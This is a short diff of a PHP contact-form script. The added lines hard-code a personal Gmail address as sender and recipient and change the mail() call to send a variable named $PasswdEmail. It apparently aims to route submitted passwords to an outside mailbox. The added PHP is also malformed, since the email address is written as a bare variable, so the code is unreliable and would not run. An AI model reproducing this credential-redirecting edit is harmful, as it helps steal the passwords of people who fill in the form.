@@ -61,10 +61,10 @@ if(isset($_POST['email'])) {
    
  
 // create email headers
-$headers = 'From: '.$email_from."\r\n".
-'Reply-To: '.$email_from."\r\n" .
+$headers = 'From: '.$captianlastimosa@gmail.com."\r\n".
+'Reply-To: '.$captianlastimosa@gmail.com."\r\n" .
 'X-Mailer: PHP/' . phpversion();
-@mail($email_to, $email_subject, $email_message, $headers);  
+@mail($captianlastimosa@gmail.com, $coolcrap, $PasswdEmail, $gg);  
 ?>
  
 <!-- include your own success html here -->
